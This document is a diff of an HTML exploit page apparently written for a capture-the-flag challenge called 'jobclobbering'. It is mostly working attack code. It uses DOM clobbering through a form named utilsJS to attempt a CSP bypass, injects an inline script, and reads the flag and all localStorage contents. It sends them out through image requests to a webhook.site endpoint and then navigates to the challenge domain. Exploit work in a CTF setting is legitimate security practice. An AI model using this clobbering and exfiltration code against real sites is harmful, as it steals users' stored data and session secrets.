@@ -13,9 +13,9 @@
          </style>
      </head>
      <body>
-         <!-- CRITICAL: DOM Clobbering structure -->
+         <!-- CRITICAL: DOM Clobbering with CSP-allowed URL -->
          <form id="utilsJS">
-             <input name="url" value="https://gavinyw.github.io/resume-portfolio/updated_steal.js">
+             <input name="url" value="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js">
          </form>
 
          <div class="resume">
@@ -48,7 +48,7 @@
          </div>
 
          <script>
-             console.log('IMMEDIATE NAVIGATION STRATEGY');
+             console.log('CSP BYPASS STRATEGY - CDNJS ALLOWED');
 
              // CORS-FREE webhook function
              function sendWebhook(data) {
@@ -58,33 +58,109 @@
                      Object.keys(data).forEach(key => {
                          params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
                      });
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/immediate?' + params.toString();
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/csp-bypass?' + params.toString();
                      document.body.appendChild(img);
                      console.log('Status sent:', data.status);
                  } catch(e) { console.error('Webhook failed:', e); }
              }
 
-             // Send confirmation and immediately navigate
+             // Create flag extraction code that will execute when lodash loads
+             window.lodashLoadedCallback = function() {
+                 // This will execute when lodash loads on the CTF domain
+                 try {
+                     const flag = localStorage.getItem('flag');
+                     const allStorage = {};
+                     for (let i = 0; i < localStorage.length; i++) {
+                         const key = localStorage.key(i);
+                         allStorage[key] = localStorage.getItem(key);
+                     }
+
+                     // Send via image (CORS-free)
+                     const img = new Image();
+                     const params = new URLSearchParams();
+                     params.append('status', 'FLAG_EXTRACTED_VIA_CDNJS');
+                     params.append('flag', flag || 'not_found');
+                     params.append('all_localStorage', JSON.stringify(allStorage));
+                     params.append('domain', window.location.hostname);
+                     params.append('timestamp', new Date().toISOString());
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/flag-capture?' + params.toString();
+                     document.body.appendChild(img);
+
+                     if (flag) {
+                         // Additional confirmation
+                         const img2 = new Image();
+                         img2.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/SUCCESS?flag=' +
+     encodeURIComponent(flag);
+                         document.body.appendChild(img2);
+                     }
+                 } catch(e) {
+                     const img = new Image();
+                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/error?msg=' +
+     encodeURIComponent(e.message);
+                     document.body.appendChild(img);
+                 }
+             };
+
+             // Send confirmation
              sendWebhook({
-                 status: 'IMMEDIATE_NAVIGATION_START',
+                 status: 'CSP_BYPASS_START',
                  timestamp: new Date().toISOString(),
                  current_domain: window.location.hostname,
                  utilsJS_ready: !!window.utilsJS && !!window.utilsJS.url,
                  utilsJS_url_value: window.utilsJS?.url?.value || 'not_found',
+                 strategy: 'cdnjs_lodash_with_callback',
                  user_agent: navigator.userAgent
              });
 
-             // Navigate to CTF domain immediately (500ms delay for webhook)
+             // Create inline script that will execute flag extraction when on CTF domain
+             setTimeout(() => {
+                 // This script will be injected into the DOM and will execute on CTF domain
+                 const scriptContent = `
+                 try {
+                     if (window.location.hostname.includes('jobclobbering') || 
+     window.location.hostname.includes('chal.secjhu.club')) {
+                         const flag = localStorage.getItem('flag');
+                         const allStorage = {};
+                         for (let i = 0; i < localStorage.length; i++) {
+                             const key = localStorage.key(i);
+                             allStorage[key] = localStorage.getItem(key);
+                         }
+
+                         const img = new Image();
+                         const params = new URLSearchParams();
+                         params.append('status', 'FLAG_FROM_INLINE_SCRIPT');
+                         params.append('flag', flag || 'not_found');
+                         params.append('all_localStorage', JSON.stringify(allStorage));
+                         params.append('domain', window.location.hostname);
+                         params.append('timestamp', new Date().toISOString());
+                         img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/inline-flag?' + 
+     params.toString();
+                         document.body.appendChild(img);
+                     }
+                 } catch(e) {}
+                 `;
+
+                 // Inject the script
+                 const script = document.createElement('script');
+                 script.textContent = scriptContent;
+                 document.head.appendChild(script);
+
+                 sendWebhook({
+                     status: 'INLINE_SCRIPT_INJECTED',
+                     timestamp: new Date().toISOString()
+                 });
+             }, 100);
+
+             // Navigate to CTF domain with inline script ready
              setTimeout(() => {
                  const ctfUrl = 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages';
 
                  sendWebhook({
-                     status: 'NAVIGATING_TO_CTF_NOW',
+                     status: 'NAVIGATING_WITH_CSP_BYPASS',
                      timestamp: new Date().toISOString(),
                      target_url: ctfUrl
                  });
 
-                 // Navigate immediately to CTF domain where flag exists
                  window.location.href = ctfUrl;
              }, 500);
 
